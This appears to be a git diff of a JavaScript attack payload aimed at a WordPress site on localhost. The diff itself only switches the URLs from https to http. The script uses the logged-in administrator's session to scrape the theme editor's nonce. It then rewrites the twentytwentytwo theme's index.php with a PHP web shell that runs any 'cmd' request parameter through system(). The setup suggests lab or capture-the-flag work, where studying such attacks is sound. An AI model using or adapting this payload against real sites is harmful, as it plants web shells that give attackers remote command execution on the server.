@@ -1,5 +1,5 @@
 async function pepe(){
-    var a = await fetch('https://localhost:1024/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include","mode":"cors"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
+    var a = await fetch('http://localhost:1024/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include","mode":"cors"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
     console.log(a);//try with a different file 
     return a;
 }
@@ -7,7 +7,7 @@ async function pepe(){
 try{
 var a = await pepe();
 
-fetch("https://localhost:1024/wp-admin/admin-ajax.php", {
+fetch("http://localhost:1024/wp-admin/admin-ajax.php", {
     "headers":{"Content-type":"application/x-www-form-urlencoded"},
 "body": `nonce=${a[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
 ?>&action=edit-theme-plugin-file&file=index.php&theme=twentytwentytwo`,
